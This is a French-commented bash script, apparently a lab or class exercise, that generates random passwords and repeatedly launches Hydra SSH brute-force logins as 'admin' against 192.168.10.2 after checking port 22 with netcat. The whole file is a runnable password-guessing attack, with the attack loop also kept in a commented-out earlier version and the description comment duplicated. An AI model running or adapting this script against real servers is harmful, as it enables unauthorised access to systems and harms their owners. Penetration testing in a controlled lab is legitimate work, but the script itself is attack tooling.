
#attack.sh
#!/bin/bash
#Description du script :
# Générez une liste de 1000 mots de passe aléatoires et stockez-la dans un fichier texte passwords.txt.
# Définissez l'adresse IP cible, le nombre total de tentatives, la durée de l'attaque, le délai entre les tentatives 
# et l'intervalle de vérification du service SSH.

# La fonction check_ssh utilise nc (Netcat) pour vérifier si le service SSH est disponible sur l'adresse IP cible.
# Le script entre dans une boucle infinie, où il vérifie d'abord si le service SSH est disponible. Si c'est le cas,
#  il lance l'attaque de force brute en utilisant Hydra avec les paramètres fournis. Si le service SSH n'est pas disponible,
#   le script attend l'intervalle de vérification du service SSH et réessaie.Générez une liste de 1000 mots de passe aléatoires et
#    stockez-la dans un fichier texte passwords.txt.

# Définissez l'adresse IP cible, le nombre total de tentatives, la durée de l'attaque, le délai entre les tentatives et l'intervalle
#  de vérification du service SSH.
# La fonction check_ssh utilise nc (Netcat) pour vérifier si le service SSH est disponible sur l'adresse IP cible.
# Le script entre dans une boucle infinie, où il vérifie d'abord si le service SSH est disponible. Si c'est le cas, 
# il lance l'attaque de force brute en utilisant Hydra avec les paramètres fournis. Si le service SSH n'est pas disponible,
#  le script attend l'intervalle de vérification du service SSH et réessaie.



# Nouveau chemin pour le fichier de mots de passe
PASS_LIST="/root/passwords/passwords.txt"

echo "Génération de la liste de mots de passe..." # Pour des raisons de débogage
#Création des 1000 mots passe qui seront tester par l'attaque 
NUM_PASSWORDS=999
PASSWORD_LENGTH=8
echo "Liste de mots de passe générée." # Pour des raisons de débogage

for i in $(seq 1 $NUM_PASSWORDS); do
  head /dev/urandom | tr -dc A-Za-z0-9 | head -c$PASSWORD_LENGTH; echo ''
done > $PASS_LIST

# Définition des variables
TARGET_IP=192.168.10.2
TOTAL_ATTEMPTS=1000
DURATION_MINUTES=10
DELAY=5
SSH_CHECK_INTERVAL=10
DELAY_BETWEEN_ATTEMPTS=5

# # Fonction pour vérifier si le service SSH est disponible
# function check_ssh {
#   nc -z -w $SSH_CHECK_INTERVAL $TARGET_IP 22
# }
# echo "Lancement de l'attaque sur $TARGET_IP pendant $DURATION_MINUTES minutes."
# echo "Nombre total de tentatives: $TOTAL_ATTEMPTS"
# echo $time
# while true; do
#   if check_ssh; then
#     hydra -l admin -P $PASS_LIST -t 1 -f -v -e nsr -s 22 -u -w $DELAY ssh://$TARGET_IP
#   else
#     echo "Le service SSH est actuellement indisponible. Tentative de reconnexion dans $SSH_CHECK_INTERVAL secondes."
#     sleep $SSH_CHECK_INTERVAL
#   fi
# done



function check_ssh {
  nc -z -w $SSH_CHECK_INTERVAL $TARGET_IP 22
}

echo "Lancement de l'attaque sur $TARGET_IP pendant $DURATION_MINUTES minutes."
echo "Nombre total de tentatives: $TOTAL_ATTEMPTS"

# Compteur de tentatives
attempt_counter=0

while true; do
  if check_ssh; then
    for i in $(seq 1 $TOTAL_ATTEMPTS); do
      attempt_counter=$((attempt_counter + 1))
      echo "Tentative d'accès au serveur SSH #$attempt_counter..."
      hydra -l admin -P $PASS_LIST -t 1 -f -v -e nsr -s 22 -u -w $DELAY ssh://$TARGET_IP

      echo "Attaque interrompue. Tentative de reconnexion à SSH #$attempt_counter..."
      sleep $DELAY_BETWEEN_ATTEMPTS
    done
    break
  else
    echo "Le service SSH est actuellement indisponible. Tentative de reconnexion dans $SSH_CHECK_INTERVAL secondes."
    sleep $SSH_CHECK_INTERVAL
  fi
done

echo "Attaque terminée. Vérifiez les résultats pour voir si l'accès a été obtenu."